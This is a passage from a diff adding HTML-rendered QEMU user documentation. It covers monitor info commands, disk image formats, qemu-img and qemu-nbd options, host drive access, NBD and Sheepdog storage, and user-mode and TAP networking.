+case a connection is established: <var>fail</var> makes the password change
+fail.  <var>disconnect</var> changes the password and disconnects the
+client.  <var>keep</var> changes the password and keeps the connection up. 
+<var>keep</var> is the default. 
+<br><dt><samp><span class="option">expire_password [ vnc | spice ] expire-time</span></samp><dd><a name="index-expire_005fpassword-200"></a>
+Specify when a password for spice/vnc becomes
+invalid. <var>expire-time</var> accepts:
+
+          <dl>
+<dt><var>now</var><dd>Invalidate password instantly.
+
+          <br><dt><var>never</var><dd>Password stays valid forever.
+
+          <br><dt><var>+nsec</var><dd>Password stays valid for <var>nsec</var> seconds starting now.
+
+          <br><dt><var>nsec</var><dd>Password is invalidated at the given time.  <var>nsec</var> are the seconds
+passed since 1970, i.e. unix epoch.
+
+     </dl>
+     <br><dt><samp><span class="option">info </span><var>subcommand</var></samp><dd><a name="index-info-201"></a>Show various information about the system state.
+
+          <dl>
+<dt><samp><span class="option">info version</span></samp><dd>show the version of QEMU
+<br><dt><samp><span class="option">info network</span></samp><dd>show the various VLANs and the associated devices
+<br><dt><samp><span class="option">info chardev</span></samp><dd>show the character devices
+<br><dt><samp><span class="option">info block</span></samp><dd>show the block devices
+<br><dt><samp><span class="option">info blockstats</span></samp><dd>show block device statistics
+<br><dt><samp><span class="option">info registers</span></samp><dd>show the cpu registers
+<br><dt><samp><span class="option">info cpus</span></samp><dd>show infos for each CPU
+<br><dt><samp><span class="option">info history</span></samp><dd>show the command line history
+<br><dt><samp><span class="option">info irq</span></samp><dd>show the interrupts statistics (if available)
+<br><dt><samp><span class="option">info pic</span></samp><dd>show i8259 (PIC) state
+<br><dt><samp><span class="option">info pci</span></samp><dd>show emulated PCI device info
+<br><dt><samp><span class="option">info tlb</span></samp><dd>show virtual to physical memory mappings (i386, SH4 and SPARC only)
+<br><dt><samp><span class="option">info mem</span></samp><dd>show the active virtual memory mappings (i386 only)
+<br><dt><samp><span class="option">info jit</span></samp><dd>show dynamic compiler info
+<br><dt><samp><span class="option">info kvm</span></samp><dd>show KVM information
+<br><dt><samp><span class="option">info numa</span></samp><dd>show NUMA information
+<br><dt><samp><span class="option">info kvm</span></samp><dd>show KVM information
+<br><dt><samp><span class="option">info usb</span></samp><dd>show USB devices plugged on the virtual USB hub
+<br><dt><samp><span class="option">info usbhost</span></samp><dd>show all USB host devices
+<br><dt><samp><span class="option">info profile</span></samp><dd>show profiling information
+<br><dt><samp><span class="option">info capture</span></samp><dd>show information about active capturing
+<br><dt><samp><span class="option">info snapshots</span></samp><dd>show list of VM snapshots
+<br><dt><samp><span class="option">info status</span></samp><dd>show the current VM status (running|paused)
+<br><dt><samp><span class="option">info pcmcia</span></samp><dd>show guest PCMCIA status
+<br><dt><samp><span class="option">info mice</span></samp><dd>show which guest mouse is receiving events
+<br><dt><samp><span class="option">info vnc</span></samp><dd>show the vnc server status
+<br><dt><samp><span class="option">info name</span></samp><dd>show the current VM name
+<br><dt><samp><span class="option">info uuid</span></samp><dd>show the current VM UUID
+<br><dt><samp><span class="option">info cpustats</span></samp><dd>show CPU statistics
+<br><dt><samp><span class="option">info usernet</span></samp><dd>show user network stack connection states
+<br><dt><samp><span class="option">info migrate</span></samp><dd>show migration status
+<br><dt><samp><span class="option">info balloon</span></samp><dd>show balloon information
+<br><dt><samp><span class="option">info qtree</span></samp><dd>show device tree
+<br><dt><samp><span class="option">info qdm</span></samp><dd>show qdev device model list
+<br><dt><samp><span class="option">info roms</span></samp><dd>show roms
+</dl>
+     <br><dt><samp><span class="option">info trace</span></samp><dd>show contents of trace buffer
+<br><dt><samp><span class="option">info trace-events</span></samp><dd>show available trace events and their state
+</dl>
+
+<h4 class="subsection">3.5.2 Integer expressions</h4>
+
+<p>The monitor understands integers expressions for every integer
+argument. You can use register names to get the value of specifics
+CPU registers by prefixing them with <em>$</em>.
+
+<p><a name="disk_images"></a>
+<a name="disk_005fimages"></a>
+
+<h3 class="section">3.6 Disk Images</h3>
+
+<p>Since version 0.6.1, QEMU supports many disk image formats, including
+growable disk images (their size increase as non empty sectors are
+written), compressed and encrypted disk images. Version 0.8.3 added
+the new qcow2 disk image format which is essential to support VM
+snapshots.
+
+<p><a name="disk_images_quickstart"></a>
+<a name="disk_005fimages_005fquickstart"></a>
+
+<h4 class="subsection">3.6.1 Quick start for disk image creation</h4>
+
+<p>You can create a disk image with the command:
+<pre class="example">qemu-img create myimage.img mysize
+</pre>
+<p>where <var>myimage.img</var> is the disk image filename and <var>mysize</var> is its
+size in kilobytes. You can add an <code>M</code> suffix to give the size in
+megabytes and a <code>G</code> suffix for gigabytes.
+
+<p>See <a href="#qemu_005fimg_005finvocation">qemu_img_invocation</a> for more information.
+
+<p><a name="disk_images_snapshot_mode"></a>
+<a name="disk_005fimages_005fsnapshot_005fmode"></a>
+
+<h4 class="subsection">3.6.2 Snapshot mode</h4>
+
+<p>If you use the option <samp><span class="option">-snapshot</span></samp>, all disk images are
+considered as read only. When sectors in written, they are written in
+a temporary file created in <samp><span class="file">/tmp</span></samp>. You can however force the
+write back to the raw disk images by using the <code>commit</code> monitor
+command (or &lt;C-a s&gt; in the serial console).
+
+<p><a name="vm_snapshots"></a>
+<a name="vm_005fsnapshots"></a>
+
+<h4 class="subsection">3.6.3 VM snapshots</h4>
+
+<p>VM snapshots are snapshots of the complete virtual machine including
+CPU state, RAM, device state and the content of all the writable
+disks. In order to use VM snapshots, you must have at least one non
+removable and writable block device using the <code>qcow2</code> disk image
+format. Normally this device is the first virtual hard drive.
+
+<p>Use the monitor command <code>savevm</code> to create a new VM snapshot or
+replace an existing one. A human readable name can be assigned to each
+snapshot in addition to its numerical ID.
+
+<p>Use <code>loadvm</code> to restore a VM snapshot and <code>delvm</code> to remove
+a VM snapshot. <code>info snapshots</code> lists the available snapshots
+with their associated information:
+
+<pre class="example">(qemu) info snapshots
+Snapshot devices: hda
+Snapshot list (from hda):
+ID        TAG                 VM SIZE                DATE       VM CLOCK
+1         start                   41M 2006-08-06 12:38:02   00:00:14.954
+2                                 40M 2006-08-06 12:43:29   00:00:18.633
+3         msys                    40M 2006-08-06 12:44:04   00:00:23.514
+</pre>
+<p>A VM snapshot is made of a VM state info (its size is shown in
+<code>info snapshots</code>) and a snapshot of every writable disk image. 
+The VM state info is stored in the first <code>qcow2</code> non removable
+and writable block device. The disk image snapshots are stored in
+every disk image. The size of a snapshot in a disk image is difficult
+to evaluate and is not shown by <code>info snapshots</code> because the
+associated disk sectors are shared among all the snapshots to save
+disk space (otherwise each snapshot would need a full copy of all the
+disk images).
+
+<p>When using the (unrelated) <code>-snapshot</code> option
+(<a href="#disk_005fimages_005fsnapshot_005fmode">disk_images_snapshot_mode</a>), you can always make VM snapshots,
+but they are deleted as soon as you exit QEMU.
+
+<p>VM snapshots currently have the following known limitations:
+     <ul>
+<li>They cannot cope with removable devices if they are removed or
+inserted after a snapshot is done. 
+<li>A few device drivers still have incomplete snapshot support so their
+state is not saved or restored properly (in particular USB). 
+</ul>
+
+<p><a name="qemu_img_invocation"></a>
+<a name="qemu_005fimg_005finvocation"></a>
+
+<h4 class="subsection">3.6.4 <code>qemu-img</code> Invocation</h4>
+
+<pre class="example"><!-- man begin SYNOPSIS -->
+usage: qemu-img command [command options]
+<!-- man end -->
+</pre>
+<!-- man begin OPTIONS -->
+<p>The following commands are supported:
+
+     <dl>
+<dt><samp><span class="option">check [-f </span><var>fmt</var><span class="option">] </span><var>filename</var></samp><br><dt><samp><span class="option">create [-f </span><var>fmt</var><span class="option">] [-o </span><var>options</var><span class="option">] </span><var>filename</var><span class="option"> [</span><var>size</var><span class="option">]</span></samp><br><dt><samp><span class="option">commit [-f </span><var>fmt</var><span class="option">] </span><var>filename</var></samp><br><dt><samp><span class="option">convert [-c] [-f </span><var>fmt</var><span class="option">] [-O </span><var>output_fmt</var><span class="option">] [-o </span><var>options</var><span class="option">] [-s </span><var>snapshot_name</var><span class="option">] </span><var>filename</var><span class="option"> [</span><var>filename2</var><span class="option"> [...]] </span><var>output_filename</var></samp><br><dt><samp><span class="option">info [-f </span><var>fmt</var><span class="option">] </span><var>filename</var></samp><br><dt><samp><span class="option">snapshot [-l | -a </span><var>snapshot</var><span class="option"> | -c </span><var>snapshot</var><span class="option"> | -d </span><var>snapshot</var><span class="option">] </span><var>filename</var></samp><br><dt><samp><span class="option">rebase [-f </span><var>fmt</var><span class="option">] [-u] -b </span><var>backing_file</var><span class="option"> [-F </span><var>backing_fmt</var><span class="option">] </span><var>filename</var></samp><br><dt><samp><span class="option">resize </span><var>filename</var><span class="option"> [+ | -]</span><var>size</var></samp><dd></dl>
+
+<p>Command parameters:
+     <dl>
+<dt><var>filename</var><dd> is a disk image filename
+<br><dt><var>fmt</var><dd>is the disk image format. It is guessed automatically in most cases. See below
+for a description of the supported disk formats.
+
+     <br><dt><var>size</var><dd>is the disk image size in bytes. Optional suffixes <code>k</code> or <code>K</code>
+(kilobyte, 1024) <code>M</code> (megabyte, 1024k) and <code>G</code> (gigabyte, 1024M)
+and T (terabyte, 1024G) are supported.  <code>b</code> is ignored.
+
+     <br><dt><var>output_filename</var><dd>is the destination disk image filename
+
+     <br><dt><var>output_fmt</var><dd> is the destination format
+<br><dt><var>options</var><dd>is a comma separated list of format specific options in a
+name=value format. Use <code>-o ?</code> for an overview of the options supported
+by the used format or see the format descriptions below for details.
+
+     <br><dt><var>-c</var><dd>indicates that target image must be compressed (qcow format only)
+<br><dt><var>-h</var><dd>with or without a command shows help and lists the supported formats
+</dl>
+
+<p>Parameters to snapshot subcommand:
+
+     <dl>
+<dt><samp><span class="option">snapshot</span></samp><dd>is the name of the snapshot to create, apply or delete
+<br><dt><samp><span class="option">-a</span></samp><dd>applies a snapshot (revert disk to saved state)
+<br><dt><samp><span class="option">-c</span></samp><dd>creates a snapshot
+<br><dt><samp><span class="option">-d</span></samp><dd>deletes a snapshot
+<br><dt><samp><span class="option">-l</span></samp><dd>lists all snapshots in the given image
+</dl>
+
+<p>Command description:
+
+     <dl>
+<dt><samp><span class="option">check [-f </span><var>fmt</var><span class="option">] </span><var>filename</var></samp><dd>
+Perform a consistency check on the disk image <var>filename</var>.
+
+     <p>Only the formats <code>qcow2</code>, <code>qed</code> and <code>vdi</code> support
+consistency checks.
+
+     <br><dt><samp><span class="option">create [-f </span><var>fmt</var><span class="option">] [-o </span><var>options</var><span class="option">] </span><var>filename</var><span class="option"> [</span><var>size</var><span class="option">]</span></samp><dd>
+Create the new disk image <var>filename</var> of size <var>size</var> and format
+<var>fmt</var>. Depending on the file format, you can add one or more <var>options</var>
+that enable additional features of this format.
+
+     <p>If the option <var>backing_file</var> is specified, then the image will record
+only the differences from <var>backing_file</var>. No size needs to be specified in
+this case. <var>backing_file</var> will never be modified unless you use the
+<code>commit</code> monitor command (or qemu-img commit).
+
+     <p>The size can also be specified using the <var>size</var> option with <code>-o</code>,
+it doesn't need to be specified separately in this case.
+
+     <br><dt><samp><span class="option">commit [-f </span><var>fmt</var><span class="option">] </span><var>filename</var></samp><dd>
+Commit the changes recorded in <var>filename</var> in its base image.
+
+     <br><dt><samp><span class="option">convert [-c] [-f </span><var>fmt</var><span class="option">] [-O </span><var>output_fmt</var><span class="option">] [-o </span><var>options</var><span class="option">] [-s </span><var>snapshot_name</var><span class="option">] </span><var>filename</var><span class="option"> [</span><var>filename2</var><span class="option"> [...]] </span><var>output_filename</var></samp><dd>
+Convert the disk image <var>filename</var> or a snapshot <var>snapshot_name</var> to disk image <var>output_filename</var>
+using format <var>output_fmt</var>. It can be optionally compressed (<code>-c</code>
+option) or use any format specific options like encryption (<code>-o</code> option).
+
+     <p>Only the formats <code>qcow</code> and <code>qcow2</code> support compression. The
+compression is read-only. It means that if a compressed sector is
+rewritten, then it is rewritten as uncompressed data.
+
+     <p>Image conversion is also useful to get smaller image when using a
+growable format such as <code>qcow</code> or <code>cow</code>: the empty sectors
+are detected and suppressed from the destination image.
+
+     <p>You can use the <var>backing_file</var> option to force the output image to be
+created as a copy on write image of the specified base image; the
+<var>backing_file</var> should have the same content as the input's base image,
+however the path, image format, etc may differ.
+
+     <br><dt><samp><span class="option">info [-f </span><var>fmt</var><span class="option">] </span><var>filename</var></samp><dd>
+Give information about the disk image <var>filename</var>. Use it in
+particular to know the size reserved on disk which can be different
+from the displayed size. If VM snapshots are stored in the disk image,
+they are displayed too.
+
+     <br><dt><samp><span class="option">snapshot [-l | -a </span><var>snapshot</var><span class="option"> | -c </span><var>snapshot</var><span class="option"> | -d </span><var>snapshot</var><span class="option"> ] </span><var>filename</var></samp><dd>
+List, apply, create or delete snapshots in image <var>filename</var>.
+
+     <br><dt><samp><span class="option">rebase [-f </span><var>fmt</var><span class="option">] [-u] -b </span><var>backing_file</var><span class="option"> [-F </span><var>backing_fmt</var><span class="option">] </span><var>filename</var></samp><dd>
+Changes the backing file of an image. Only the formats <code>qcow2</code> and
+<code>qed</code> support changing the backing file.
+
+     <p>The backing file is changed to <var>backing_file</var> and (if the image format of
+<var>filename</var> supports this) the backing file format is changed to
+<var>backing_fmt</var>.
+
+     <p>There are two different modes in which <code>rebase</code> can operate:
+          <dl>
+<dt><samp><span class="option">Safe mode</span></samp><dd>This is the default mode and performs a real rebase operation. The new backing
+file may differ from the old one and qemu-img rebase will take care of keeping
+the guest-visible content of <var>filename</var> unchanged.
+
+          <p>In order to achieve this, any clusters that differ between <var>backing_file</var>
+and the old backing file of <var>filename</var> are merged into <var>filename</var>
+before actually changing the backing file.
+
+          <p>Note that the safe mode is an expensive operation, comparable to converting
+an image. It only works if the old backing file still exists.
+
+          <br><dt><samp><span class="option">Unsafe mode</span></samp><dd>qemu-img uses the unsafe mode if <code>-u</code> is specified. In this mode, only the
+backing file name and format of <var>filename</var> is changed without any checks
+on the file contents. The user must take care of specifying the correct new
+backing file, or the guest-visible content of the image will be corrupted.
+
+          <p>This mode is useful for renaming or moving the backing file to somewhere else. 
+It can be used without an accessible old backing file, i.e. you can use it to
+fix an image whose backing file has already been moved/renamed. 
+</dl>
+
+     <br><dt><samp><span class="option">resize </span><var>filename</var><span class="option"> [+ | -]</span><var>size</var></samp><dd>
+Change the disk image as if it had been created with <var>size</var>.
+
+     <p>Before using this command to shrink a disk image, you MUST use file system and
+partitioning tools inside the VM to reduce allocated file systems and partition
+sizes accordingly.  Failure to do so will result in data loss!
+
+     <p>After using this command to grow a disk image, you must use file system and
+partitioning tools inside the VM to actually begin using the new space on the
+device. 
+</dl>
+
+<p>Supported image file formats:
+
+     <dl>
+<dt><samp><span class="option">raw</span></samp><dd>
+Raw disk image format (default). This format has the advantage of
+being simple and easily exportable to all other emulators. If your
+file system supports <em>holes</em> (for example in ext2 or ext3 on
+Linux or NTFS on Windows), then only the written sectors will reserve
+space. Use <code>qemu-img info</code> to know the real size used by the
+image or <code>ls -ls</code> on Unix/Linux.
+
+     <br><dt><samp><span class="option">host_device</span></samp><dd>
+Host device format. This format should be used instead of raw when
+converting to block devices or other devices where "holes" are not
+supported.
+
+     <br><dt><samp><span class="option">qcow2</span></samp><dd>QEMU image format, the most versatile format. Use it to have smaller
+images (useful if your filesystem does not supports holes, for example
+on Windows), optional AES encryption, zlib based compression and
+support of multiple VM snapshots.
+
+     <p>Supported options:
+          <dl>
+<dt><code>backing_file</code><dd>File name of a base image (see <samp><span class="option">create</span></samp> subcommand)
+<br><dt><code>backing_fmt</code><dd>Image format of the base image
+<br><dt><code>encryption</code><dd>If this option is set to <code>on</code>, the image is encrypted.
+
+          <p>Encryption uses the AES format which is very secure (128 bit keys). Use
+a long password (16 characters) to get maximum protection.
+
+          <br><dt><code>cluster_size</code><dd>Changes the qcow2 cluster size (must be between 512 and 2M). Smaller cluster
+sizes can improve the image file size whereas larger cluster sizes generally
+provide better performance.
+
+          <br><dt><code>preallocation</code><dd>Preallocation mode (allowed values: off, metadata). An image with preallocated
+metadata is initially larger but can improve performance when the image needs
+to grow.
+
+     </dl>
+
+     <br><dt><samp><span class="option">qcow</span></samp><dd>Old QEMU image format. Left for compatibility.
+
+     <p>Supported options:
+          <dl>
+<dt><code>backing_file</code><dd>File name of a base image (see <samp><span class="option">create</span></samp> subcommand)
+<br><dt><code>encryption</code><dd>If this option is set to <code>on</code>, the image is encrypted. 
+</dl>
+
+     <br><dt><samp><span class="option">cow</span></samp><dd>User Mode Linux Copy On Write image format. Used to be the only growable
+image format in QEMU. It is supported only for compatibility with
+previous versions. It does not work on win32. 
+<br><dt><samp><span class="option">vdi</span></samp><dd>VirtualBox 1.1 compatible image format. 
+<br><dt><samp><span class="option">vmdk</span></samp><dd>VMware 3 and 4 compatible image format.
+
+     <p>Supported options:
+          <dl>
+<dt><code>backing_fmt</code><dd>Image format of the base image
+<br><dt><code>compat6</code><dd>Create a VMDK version 6 image (instead of version 4)
+</dl>
+
+     <br><dt><samp><span class="option">vpc</span></samp><dd>VirtualPC compatible image format (VHD).
+
+     <br><dt><samp><span class="option">cloop</span></samp><dd>Linux Compressed Loop image, useful only to reuse directly compressed
+CD-ROM images present for example in the Knoppix CD-ROMs. 
+</dl>
+
+<!-- man end -->
+<p><a name="qemu_nbd_invocation"></a>
+<a name="qemu_005fnbd_005finvocation"></a>
+
+<h4 class="subsection">3.6.5 <code>qemu-nbd</code> Invocation</h4>
+
+<pre class="example"><!-- man begin SYNOPSIS -->
+usage: qemu-nbd [OPTION]...  <var>filename</var>
+<!-- man end -->
+</pre>
+<!-- man begin DESCRIPTION -->
+<p>Export Qemu disk image using NBD protocol.
+
+<!-- man end -->
+<!-- man begin OPTIONS -->
+     <dl>
+<dt><samp><var>filename</var></samp><dd> is a disk image filename
+<br><dt><samp><span class="option">-p, --port=</span><var>port</var></samp><dd>  port to listen on (default &lsquo;<samp><span class="samp">1024</span></samp>&rsquo;)
+<br><dt><samp><span class="option">-o, --offset=</span><var>offset</var></samp><dd>  offset into the image
+<br><dt><samp><span class="option">-b, --bind=</span><var>iface</var></samp><dd>  interface to bind to (default &lsquo;<samp><span class="samp">0.0.0.0</span></samp>&rsquo;)
+<br><dt><samp><span class="option">-k, --socket=</span><var>path</var></samp><dd>  Use a unix socket with path <var>path</var>
+<br><dt><samp><span class="option">-r, --read-only</span></samp><dd>  export read-only
+<br><dt><samp><span class="option">-P, --partition=</span><var>num</var></samp><dd>  only expose partition <var>num</var>
+<br><dt><samp><span class="option">-s, --snapshot</span></samp><dd>  use snapshot file
+<br><dt><samp><span class="option">-n, --nocache</span></samp><dd>  disable host cache
+<br><dt><samp><span class="option">-c, --connect=</span><var>dev</var></samp><dd>  connect <var>filename</var> to NBD device <var>dev</var>
+<br><dt><samp><span class="option">-d, --disconnect</span></samp><dd>  disconnect the specified device
+<br><dt><samp><span class="option">-e, --shared=</span><var>num</var></samp><dd>  device can be shared by <var>num</var> clients (default &lsquo;<samp><span class="samp">1</span></samp>&rsquo;)
+<br><dt><samp><span class="option">-t, --persistent</span></samp><dd>  don't exit on the last connection
+<br><dt><samp><span class="option">-v, --verbose</span></samp><dd>  display extra debugging information
+<br><dt><samp><span class="option">-h, --help</span></samp><dd>  display this help and exit
+<br><dt><samp><span class="option">-V, --version</span></samp><dd>  output version information and exit
+</dl>
+
+<!-- man end -->
+<p><a name="host_drives"></a>
+<a name="host_005fdrives"></a>
+
+<h4 class="subsection">3.6.6 Using host drives</h4>
+
+<p>In addition to disk image files, QEMU can directly access host
+devices. We describe here the usage for QEMU version &gt;= 0.8.3.
+
+<h5 class="subsubsection">3.6.6.1 Linux</h5>
+
+<p>On Linux, you can directly use the host device filename instead of a
+disk image filename provided you have enough privileges to access
+it. For example, use <samp><span class="file">/dev/cdrom</span></samp> to access to the CDROM or
+<samp><span class="file">/dev/fd0</span></samp> for the floppy.
+
+     <dl>
+<dt><code>CD</code><dd>You can specify a CDROM device even if no CDROM is loaded. QEMU has
+specific code to detect CDROM insertion or removal. CDROM ejection by
+the guest OS is supported. Currently only data CDs are supported. 
+<br><dt><code>Floppy</code><dd>You can specify a floppy device even if no floppy is loaded. Floppy
+removal is currently not detected accurately (if you change floppy
+without doing floppy access while the floppy is not loaded, the guest
+OS will think that the same floppy is loaded). 
+<br><dt><code>Hard disks</code><dd>Hard disks can be used. Normally you must specify the whole disk
+(<samp><span class="file">/dev/hdb</span></samp> instead of <samp><span class="file">/dev/hdb1</span></samp>) so that the guest OS can
+see it as a partitioned disk. WARNING: unless you know what you do, it
+is better to only make READ-ONLY accesses to the hard disk otherwise
+you may corrupt your host data (use the <samp><span class="option">-snapshot</span></samp> command
+line option or modify the device permissions accordingly). 
+</dl>
+
+<h5 class="subsubsection">3.6.6.2 Windows</h5>
+
+     <dl>
+<dt><code>CD</code><dd>The preferred syntax is the drive letter (e.g. <samp><span class="file">d:</span></samp>). The
+alternate syntax <samp><span class="file">\\.\d:</span></samp> is supported. <samp><span class="file">/dev/cdrom</span></samp> is
+supported as an alias to the first CDROM drive.
+
+     <p>Currently there is no specific code to handle removable media, so it
+is better to use the <code>change</code> or <code>eject</code> monitor commands to
+change or eject media. 
+<br><dt><code>Hard disks</code><dd>Hard disks can be used with the syntax: <samp><span class="file">\\.\PhysicalDrive</span><var>N</var></samp>
+where <var>N</var> is the drive number (0 is the first hard disk).
+
+     <p>WARNING: unless you know what you do, it is better to only make
+READ-ONLY accesses to the hard disk otherwise you may corrupt your
+host data (use the <samp><span class="option">-snapshot</span></samp> command line so that the
+modifications are written in a temporary file). 
+</dl>
+
+<h5 class="subsubsection">3.6.6.3 Mac OS X</h5>
+
+<p><samp><span class="file">/dev/cdrom</span></samp> is an alias to the first CDROM.
+
+<p>Currently there is no specific code to handle removable media, so it
+is better to use the <code>change</code> or <code>eject</code> monitor commands to
+change or eject media.
+
+<p><a name="disk_images_fat_images"></a>
+<a name="disk_005fimages_005ffat_005fimages"></a>
+
+<h4 class="subsection">3.6.7 Virtual FAT disk images</h4>
+
+<p>QEMU can automatically create a virtual FAT disk image from a
+directory tree. In order to use it, just type:
+
+<pre class="example">qemu linux.img -hdb fat:/my_directory
+</pre>
+<p>Then you access access to all the files in the <samp><span class="file">/my_directory</span></samp>
+directory without having to copy them in a disk image or to export
+them via SAMBA or NFS. The default access is <em>read-only</em>.
+
+<p>Floppies can be emulated with the <code>:floppy:</code> option:
+
+<pre class="example">qemu linux.img -fda fat:floppy:/my_directory
+</pre>
+<p>A read/write support is available for testing (beta stage) with the
+<code>:rw:</code> option:
+
+<pre class="example">qemu linux.img -fda fat:floppy:rw:/my_directory
+</pre>
+<p>What you should <em>never</em> do:
+     <ul>
+<li>use non-ASCII filenames ;
+<li>use "-snapshot" together with ":rw:" ;
+<li>expect it to work when loadvm'ing ;
+<li>write to the FAT directory on the host system while accessing it with the guest system. 
+</ul>
+
+<p><a name="disk_images_nbd"></a>
+<a name="disk_005fimages_005fnbd"></a>
+
+<h4 class="subsection">3.6.8 NBD access</h4>
+
+<p>QEMU can access directly to block device exported using the Network Block Device
+protocol.
+
+<pre class="example">qemu linux.img -hdb nbd:my_nbd_server.mydomain.org:1024
+</pre>
+<p>If the NBD server is located on the same host, you can use an unix socket instead
+of an inet socket:
+
+<pre class="example">qemu linux.img -hdb nbd:unix:/tmp/my_socket
+</pre>
+<p>In this case, the block device must be exported using qemu-nbd:
+
+<pre class="example">qemu-nbd --socket=/tmp/my_socket my_disk.qcow2
+</pre>
+<p>The use of qemu-nbd allows to share a disk between several guests:
+<pre class="example">qemu-nbd --socket=/tmp/my_socket --share=2 my_disk.qcow2
+</pre>
+<p>and then you can use it with two guests:
+<pre class="example">qemu linux1.img -hdb nbd:unix:/tmp/my_socket
+qemu linux2.img -hdb nbd:unix:/tmp/my_socket
+</pre>
+<p>If the nbd-server uses named exports (since NBD 2.9.18), you must use the
+"exportname" option:
+<pre class="example">qemu -cdrom nbd:localhost:exportname=debian-500-ppc-netinst
+qemu -cdrom nbd:localhost:exportname=openSUSE-11.1-ppc-netinst
+</pre>
+<p><a name="disk_images_sheepdog"></a>
+<a name="disk_005fimages_005fsheepdog"></a>
+
+<h4 class="subsection">3.6.9 Sheepdog disk images</h4>
+
+<p>Sheepdog is a distributed storage system for QEMU.  It provides highly
+available block level storage volumes that can be attached to
+QEMU-based virtual machines.
+
+<p>You can create a Sheepdog disk image with the command:
+<pre class="example">qemu-img create sheepdog:<var>image</var> <var>size</var>
+</pre>
+<p>where <var>image</var> is the Sheepdog image name and <var>size</var> is its
+size.
+
+<p>To import the existing <var>filename</var> to Sheepdog, you can use a
+convert command.
+<pre class="example">qemu-img convert <var>filename</var> sheepdog:<var>image</var>
+</pre>
+<p>You can boot from the Sheepdog disk image with the command:
+<pre class="example">qemu sheepdog:<var>image</var>
+</pre>
+<p>You can also create a snapshot of the Sheepdog image like qcow2.
+<pre class="example">qemu-img snapshot -c <var>tag</var> sheepdog:<var>image</var>
+</pre>
+<p>where <var>tag</var> is a tag name of the newly created snapshot.
+
+<p>To boot from the Sheepdog snapshot, specify the tag name of the
+snapshot.
+<pre class="example">qemu sheepdog:<var>image</var>:<var>tag</var>
+</pre>
+<p>You can create a cloned image from the existing snapshot.
+<pre class="example">qemu-img create -b sheepdog:<var>base</var>:<var>tag</var> sheepdog:<var>image</var>
+</pre>
+<p>where <var>base</var> is a image name of the source snapshot and <var>tag</var>
+is its tag name.
+
+<p>If the Sheepdog daemon doesn't run on the local host, you need to
+specify one of the Sheepdog servers to connect to.
+<pre class="example">qemu-img create sheepdog:<var>hostname</var>:<var>port</var>:<var>image</var> <var>size</var>
+qemu sheepdog:<var>hostname</var>:<var>port</var>:<var>image</var>
+</pre>
+<p><a name="pcsys_network"></a>
+<a name="pcsys_005fnetwork"></a>
+
+<h3 class="section">3.7 Network emulation</h3>
+
+<p>QEMU can simulate several network cards (PCI or ISA cards on the PC
+target) and can connect them to an arbitrary number of Virtual Local
+Area Networks (VLANs). Host TAP devices can be connected to any QEMU
+VLAN. VLAN can be connected between separate instances of QEMU to
+simulate large networks. For simpler usage, a non privileged user mode
+network stack can replace the TAP device to have a basic network
+connection.
+
+<h4 class="subsection">3.7.1 VLANs</h4>
+
+<p>QEMU simulates several VLANs. A VLAN can be symbolised as a virtual
+connection between several network devices. These devices can be for
+example QEMU virtual Ethernet cards or virtual Host ethernet devices
+(TAP devices).
+
+<h4 class="subsection">3.7.2 Using TAP network interfaces</h4>
+
+<p>This is the standard way to connect QEMU to a real network. QEMU adds
+a virtual network device on your host (called <code>tapN</code>), and you
+can then configure it as if it was a real ethernet card.
+
+<h5 class="subsubsection">3.7.2.1 Linux host</h5>
+
+<p>As an example, you can download the <samp><span class="file">linux-test-xxx.tar.gz</span></samp>
+archive and copy the script <samp><span class="file">qemu-ifup</span></samp> in <samp><span class="file">/etc</span></samp> and
+configure properly <code>sudo</code> so that the command <code>ifconfig</code>
+contained in <samp><span class="file">qemu-ifup</span></samp> can be executed as root. You must verify
+that your host kernel supports the TAP network interfaces: the
+device <samp><span class="file">/dev/net/tun</span></samp> must be present.
+
+<p>See <a href="#sec_005finvocation">sec_invocation</a> to have examples of command lines using the
+TAP network interfaces.
+
+<h5 class="subsubsection">3.7.2.2 Windows host</h5>
+
+<p>There is a virtual ethernet driver for Windows 2000/XP systems, called
+TAP-Win32. But it is not included in standard QEMU for Windows,
+so you will need to get it separately. It is part of OpenVPN package,
+so download OpenVPN from : <a href="http://openvpn.net/">http://openvpn.net/</a>.
+
+<h4 class="subsection">3.7.3 Using the user mode network stack</h4>
+
+<p>By using the option <samp><span class="option">-net user</span></samp> (default configuration if no
+<samp><span class="option">-net</span></samp> option is specified), QEMU uses a completely user mode
+network stack (you don't need root privilege to use the virtual
+network). The virtual network configuration is the following:
+
+<pre class="example">
+         QEMU VLAN      &lt;------&gt;  Firewall/DHCP server &lt;-----&gt; Internet
+                           |          (10.0.2.2)
+                           |
+                           ----&gt;  DNS server (10.0.2.3)
+                           |
+                           ----&gt;  SMB server (10.0.2.4)
+</pre>
+<p>The QEMU VM behaves as if it was behind a firewall which blocks all
+incoming connections. You can use a DHCP client to automatically
+configure the network in the QEMU VM. The DHCP server assign addresses
+to the hosts starting from 10.0.2.15.
+
+<p>In order to check that the user mode network is working, you can ping
+the address 10.0.2.2 and verify that you got an address in the range
+10.0.2.x from the QEMU virtual DHCP server.
+
+<p>Note that <code>ping</code> is not supported reliably to the internet as it
+would require root privileges. It means you can only ping the local
+router (10.0.2.2).
+
+<p>When using the built-in TFTP server, the router is also the TFTP
+server.
+
+<p>When using the <samp><span class="option">-redir</span></samp> option, TCP or UDP connections can be
+redirected from the host to the guest. It allows for example to
+redirect X11, telnet or SSH connections.
+
+<h4 class="subsection">3.7.4 Connecting VLANs between QEMU instances</h4>
+
+<p>Using the <samp><span class="option">-net socket</span></samp> option, it is possible to make VLANs
+that span several QEMU instances. See <a href="#sec_005finvocation">sec_invocation</a> to have a
+basic example.
+
+<p><a name="pcsys_other_devs"></a>
+<a name="pcsys_005fother_005fdevs"></a>
+
+<h3 class="section">3.8 Other Devices</h3>
+
+<h4 class="subsection">3.8.1 Inter-VM Shared Memory device</h4>
+
+<p>With KVM enabled on a Linux host, a shared memory device is available.  Guests
+map a POSIX shared memory region into the guest as a PCI device that enables
+zero-copy communication to the application level of the guests.  The basic
+syntax is:
+
+<pre class="example">qemu -device ivshmem,size=&lt;size in format accepted by -m&gt;[,shm=&lt;shm name&gt;]
+</pre>
+<p>If desired, interrupts can be sent between guest VMs accessing the same shared
+memory region.  Interrupt support requires using a shared memory server and
+using a chardev socket to connect to it.  The code for the shared memory server
+is qemu.git/contrib/ivshmem-server.  An example syntax when using the shared
+memory server is:
+
+<pre class="example">qemu -device ivshmem,size=&lt;size in format accepted by -m&gt;[,chardev=&lt;id&gt;]
+                        [,msi=on][,ioeventfd=on][,vectors=n][,role=peer|master]
